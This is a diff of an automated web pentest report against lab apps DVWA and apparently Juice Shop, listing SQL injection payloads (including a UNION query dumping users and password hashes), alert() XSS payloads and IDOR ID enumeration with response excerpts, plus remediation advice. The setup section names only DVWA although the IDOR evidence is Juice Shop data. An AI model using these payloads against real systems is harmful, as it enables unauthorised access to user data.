@@ -1,21 +1,21 @@
 # Automated Web Pentest Report
 
-**Scan Date:** 2025-06-27T01:43:21.660686Z  
-**Target:** Full Automated Web Pentest
+*Scan Date:* 2025-07-04T00:50:50.886209Z  
+*Target:* Full Automated Web Pentest
 
-## Test Environment
+## Test Environment: DVWA
 
-- **Server OS:** Kali GNU/Linux Rolling
-- **Python Version:** 3.13.3
-- **Scan Date:** 2025-06-27 01:43:21 UTC
-- **SQLmap Version:** 1.9.4#stable
-- **Target App:** DVWA (Damn Vulnerable Web Application)
-- **Version:** 1.10 *Development*
-- **Security Level:** low
-- **Web Server:** Apache 2.4
-- **Database:** MySQL 8
-- **Language:** PHP 8.1
-- **Tools Used:** Python requests, BeautifulSoup4, SQLmap, Burp Suite (manual verify)
+- *Server OS:* Kali GNU/Linux Rolling
+- *Python Version:* 3.13.3
+- *Scan Date:* 2025-07-04 00:50:50 UTC
+- *SQLmap Version:* 1.9.4#stable
+- *Target App:* DVWA (Damn Vulnerable Web Application)
+- *Version:* 1.10 Development
+- *Security Level:* low
+- *Web Server:* Apache 2.4
+- *Database:* MySQL 8
+- *Language:* PHP 8.1
+- *Tools Used:* Python requests, BeautifulSoup4, SQLmap, Burp Suite (manual verify)
 
 ---
 ## Methodology & Tools
@@ -26,28 +26,21 @@
 - Ready for CI/CD: can run in GitHub Actions/Jenkins.
 
 ---
-## Executive Summary
-- Total vulnerabilities tested: 24  
-- Successful exploits: 19  
-- Risk Level: **Critical**
 
-
----
-
-## SQL Injection Test Cases
+### SQL Injection Test Cases
 
 | # | Payload | Status | Severity |
 |---|---------|--------|----------|
-| 1 | `' OR '1'='1` | Success | Critical |
-| 2 | `' OR 1=1 #` | Success | Critical |
-| 3 | `' union select user, password from users#` | Success | Critical |
-| 4 | `addadasddad` | Fail | Low |
+| 1 | ' OR '1'='1 | Success | Critical |
+| 2 | ' OR 1=1 # | Success | Critical |
+| 3 | ' union select user, password from users# | Success | Critical |
+| 4 | addadasddad | Fail | Low |
 
 ---
-### SQL Injection Evidence Details
+#### SQL Injection Evidence Details
 
-**Severity:** `Critical`
-#### Payload: `' OR '1'='1`
+*Severity:* `Critical`
+##### Payload: `' OR '1'='1`
 ```
 ID: ' OR '1'='1
 First name: admin
@@ -70,8 +63,8 @@ First name: Bob
 Surname: Smith
 ```
 
-**Severity:** `Critical`
-#### Payload: `' OR 1=1 #`
+*Severity:* `Critical`
+##### Payload: `' OR 1=1 #`
 ```
 ID: ' OR 1=1 #
 First name: admin
@@ -94,8 +87,8 @@ First name: Bob
 Surname: Smith
 ```
 
-**Severity:** `Critical`
-#### Payload: `' union select user, password from users#`
+*Severity:* `Critical`
+##### Payload: `' union select user, password from users#`
 ```
 ID: ' union select user, password from users#
 First name: admin
@@ -118,34 +111,34 @@ First name: smithy
 Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 ```
 
-**Severity:** `Low`
-#### Payload: `addadasddad`
+*Severity:* `Low`
+##### Payload: `addadasddad`
 ```
 User ID:
 ```
 
 ---
 
-## XSS Test Cases
+### XSS Test Cases
 
 | # | Payload | Status | Severity |
 |---|---------|--------|----------|
-| 1 | `<script>alert('XSS')</script>` | Success | High |
-| 2 | `"><img src=x onerror=alert(1)>` | Success | High |
-| 3 | `<svg/onload=alert(1)>` | Success | High |
-| 4 | `<body onload=alert('xss')>` | Success | High |
-| 5 | `"><svg onload=alert('xss')>` | Success | High |
-| 6 | `<script>alert('XSS')</script>` | Success | High |
-| 7 | `"><img src=x onerror=alert(1)>` | Success | High |
-| 8 | `<svg/onload=alert(1)>` | Success | High |
-| 9 | `<body onload=alert('xss')>` | Success | High |
-| 10 | `"><svg onload=alert('xss')>` | Success | High |
+| 1 | <script>alert('XSS')</script> | Success | High |
+| 2 | "><img src=x onerror=alert(1)> | Success | High |
+| 3 | <svg/onload=alert(1)> | Success | High |
+| 4 | <body onload=alert('xss')> | Success | High |
+| 5 | "><svg onload=alert('xss')> | Success | High |
+| 6 | <script>alert('XSS')</script> | Success | High |
+| 7 | "><img src=x onerror=alert(1)> | Success | High |
+| 8 | <svg/onload=alert(1)> | Success | High |
+| 9 | <body onload=alert('xss')> | Success | High |
+| 10 | "><svg onload=alert('xss')> | Success | High |
 
 ---
-### XSS Evidence Details
+#### XSS Evidence Details
 
-**Severity:** `High`
-#### Payload: `<script>alert('XSS')</script>`
+*Severity:* `High`
+##### Payload: `<script>alert('XSS')</script>`
 ```
 Payload reflected: <script>alert('XSS')</script>
 
@@ -154,8 +147,8 @@ Detected <script> tag in response.
 Detected alert() in response.
 ```
 
-**Severity:** `High`
-#### Payload: `"><img src=x onerror=alert(1)>`
+*Severity:* `High`
+##### Payload: `"><img src=x onerror=alert(1)>`
 ```
 Payload reflected: "><img src=x onerror=alert(1)>
 
@@ -166,8 +159,8 @@ Detected alert() in response.
 Detected image/event XSS payload.
 ```
 
-**Severity:** `High`
-#### Payload: `<svg/onload=alert(1)>`
+*Severity:* `High`
+##### Payload: `<svg/onload=alert(1)>`
 ```
 Payload reflected: <svg/onload=alert(1)>
 
@@ -176,8 +169,8 @@ Detected <script> tag in response.
 Detected alert() in response.
 ```
 
-**Severity:** `High`
-#### Payload: `<body onload=alert('xss')>`
+*Severity:* `High`
+##### Payload: `<body onload=alert('xss')>`
 ```
 Payload reflected: <body onload=alert('xss')>
 
@@ -186,8 +179,8 @@ Detected <script> tag in response.
 Detected alert() in response.
 ```
 
-**Severity:** `High`
-#### Payload: `"><svg onload=alert('xss')>`
+*Severity:* `High`
+##### Payload: `"><svg onload=alert('xss')>`
 ```
 Payload reflected: "><svg onload=alert('xss')>
 
@@ -196,130 +189,130 @@ Detected <script> tag in response.
 Detected alert() in response.
 ```
 
-**Severity:** `High`
-#### Payload: `<script>alert('XSS')</script>`
+*Severity:* `High`
+##### Payload: `<script>alert('XSS')</script>`
 ```
 Detected <script> tag in response.
 ```
 
-**Severity:** `High`
-#### Payload: `"><img src=x onerror=alert(1)>`
+*Severity:* `High`
+##### Payload: `"><img src=x onerror=alert(1)>`
 ```
 Detected <script> tag in response.
 ```
 
-**Severity:** `High`
-#### Payload: `<svg/onload=alert(1)>`
+*Severity:* `High`
+##### Payload: `<svg/onload=alert(1)>`
 ```
 Detected <script> tag in response.
 ```
 
-**Severity:** `High`
-#### Payload: `<body onload=alert('xss')>`
+*Severity:* `High`
+##### Payload: `<body onload=alert('xss')>`
 ```
 Detected <script> tag in response.
 ```
 
-**Severity:** `High`
-#### Payload: `"><svg onload=alert('xss')>`
+*Severity:* `High`
+##### Payload: `"><svg onload=alert('xss')>`
 ```
 Detected <script> tag in response.
 ```
 
 ---
 
-## IDOR Test Cases
+### IDOR Test Cases
 
 | # | Payload | Status | Severity |
 |---|---------|--------|----------|
-| 1 | `1` | Success | High |
-| 2 | `2` | Success | High |
-| 3 | `3` | Success | High |
-| 4 | `4` | Success | High |
-| 5 | `5` | Success | High |
-| 6 | `6` | Success | High |
-| 7 | `7` | Fail | Low |
-| 8 | `8` | Fail | Low |
-| 9 | `9` | Fail | Low |
-| 10 | `10` | Fail | Low |
+| 1 | 1 | Success | High |
+| 2 | 2 | Success | High |
+| 3 | 3 | Success | High |
+| 4 | 4 | Success | High |
+| 5 | 5 | Success | High |
+| 6 | 6 | Success | High |
+| 7 | 7 | Success | High |
+| 8 | 8 | Success | High |
+| 9 | 9 | Fail | Low |
+| 10 | 10 | Fail | Low |
 
 ---
-### IDOR Evidence Details
+#### IDOR Evidence Details
 
-**Severity:** `High`
-#### Payload: `1`
+*Severity:* `High`
+##### Payload: `1`
 ```
 Status: 200
 
-Response: {"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2025-06-21T07:47:08.280Z","updatedAt":"2025-06-21T07:47:08.280Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"202
+Response: {"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2025-07-01T16:50:02.422Z","updatedAt":"2025-07-01T16:50:02.422Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"202
 ```
 
-**Severity:** `High`
-#### Payload: `2`
-```
-Status: 200
-
-Response: {"status":"success","data":{"id":2,"coupon":null,"UserId":2,"createdAt":"2025-06-21T07:47:08.280Z","updatedAt":"2025-06-21T07:47:08.280Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"ra
-```
-
-**Severity:** `High`
-#### Payload: `3`
+*Severity:* `High`
+##### Payload: `2`
 ```
 Status: 200
 
-Response: {"status":"success","data":{"id":3,"coupon":null,"UserId":3,"createdAt":"2025-06-21T07:47:08.280Z","updatedAt":"2025-06-21T07:47:08.280Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"ra
+Response: {"status":"success","data":{"id":2,"coupon":null,"UserId":2,"createdAt":"2025-07-01T16:50:02.422Z","updatedAt":"2025-07-01T16:50:02.422Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"ra
 ```
 
-**Severity:** `High`
-#### Payload: `4`
-```
-Status: 200
-
-Response: {"status":"success","data":{"id":4,"coupon":null,"UserId":11,"createdAt":"2025-06-21T07:47:08.280Z","updatedAt":"2025-06-21T07:47:08.280Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"r
-```
-
-**Severity:** `High`
-#### Payload: `5`
+*Severity:* `High`
+##### Payload: `3`
 ```
 Status: 200
 
-Response: {"status":"success","data":{"id":5,"coupon":null,"UserId":16,"createdAt":"2025-06-21T07:47:08.280Z","updatedAt":"2025-06-21T07:47:08.280Z","Products":[{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jp
+Response: {"status":"success","data":{"id":3,"coupon":null,"UserId":3,"createdAt":"2025-07-01T16:50:02.422Z","updatedAt":"2025-07-01T16:50:02.422Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"ra
 ```
 
-**Severity:** `High`
-#### Payload: `6`
+*Severity:* `High`
+##### Payload: `4`
 ```
 Status: 200
 
-Response: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,"createdAt":"2025-06-21T08:27:39.619Z","updatedAt":"2025-06-21T08:27:39.619Z","Products":[]}}
+Response: {"status":"success","data":{"id":4,"coupon":null,"UserId":11,"createdAt":"2025-07-01T16:50:02.422Z","updatedAt":"2025-07-01T16:50:02.422Z","Products":[{"id":4,"name":"Raspberry Juice (1000ml)","description":"Made from blended Raspberry Pi, water and sugar.","price":4.99,"deluxePrice":4.99,"image":"r
 ```
 
-**Severity:** `Low`
-#### Payload: `7`
+*Severity:* `High`
+##### Payload: `5`
+```
+Status: 200
+
+Response: {"status":"success","data":{"id":5,"coupon":null,"UserId":16,"createdAt":"2025-07-01T16:50:02.422Z","updatedAt":"2025-07-01T16:50:02.422Z","Products":[{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jp
+```
+
+*Severity:* `High`
+##### Payload: `6`
+```
+Status: 200
+
+Response: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,"createdAt":"2025-07-03T17:48:53.227Z","updatedAt":"2025-07-03T17:48:53.227Z","Products":[{"id":6,"name":"Banana Juice (1000ml)","description":"Monkeys love it the most.","price":1.99,"deluxePrice":1.99,"image":"banana_juice.jpg","createdA
+```
+
+*Severity:* `High`
+##### Payload: `7`
+```
+Status: 200
+
+Response: {"status":"success","data":{"id":7,"coupon":null,"UserId":23,"createdAt":"2025-07-03T17:50:53.072Z","updatedAt":"2025-07-03T17:50:53.072Z","Products":[{"id":42,"name":"Best Juice Shop Salesman Artwork","description":"Unique digital painting depicting Stan, our most qualified and almost profitable sa
+```
+
+*Severity:* `High`
+##### Payload: `8`
+```
+Status: 200
+
+Response: {"status":"success","data":{"id":8,"coupon":null,"UserId":24,"createdAt":"2025-07-03T17:59:23.545Z","updatedAt":"2025-07-03T17:59:23.545Z","Products":[{"id":42,"name":"Best Juice Shop Salesman Artwork","description":"Unique digital painting depicting Stan, our most qualified and almost profitable sa
+```
+
+*Severity:* `Low`
+##### Payload: `9`
 ```
 Status: 200
 
 Response: {"status":"success","data":{}}
 ```
 
-**Severity:** `Low`
-#### Payload: `8`
-```
-Status: 200
-
-Response: {"status":"success","data":{}}
-```
-
-**Severity:** `Low`
-#### Payload: `9`
-```
-Status: 200
-
-Response: {"status":"success","data":{}}
-```
-
-**Severity:** `Low`
-#### Payload: `10`
+*Severity:* `Low`
+##### Payload: `10`
 ```
 Status: 200
 
@@ -331,7 +324,7 @@ Response: {"status":"success","data":{}}
 - Use prepared statements (parameterized queries) for all database access.
 - Enable a Web Application Firewall (e.g., ModSecurity + CRS) in production.
 - Build a code review checklist for input validation and output encoding.
-- Patch DVWA and all dependencies regularly.
+- Patch all web apps and dependencies regularly.
 - Integrate automated security testing (e.g., SonarQube, OWASP ZAP) into CI/CD.
 - Regularly update payload signatures and review recent CVE advisories.
 
@@ -340,6 +333,7 @@ Response: {"status":"success","data":{}}
 - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
 - PayloadAllTheThings SQLi: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - DVWA GitHub: https://github.com/digininja/DVWA
+- Juice Shop GitHub: https://github.com/juice-shop/juice-shop
 - SQLmap: http://sqlmap.org/
 - OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
 
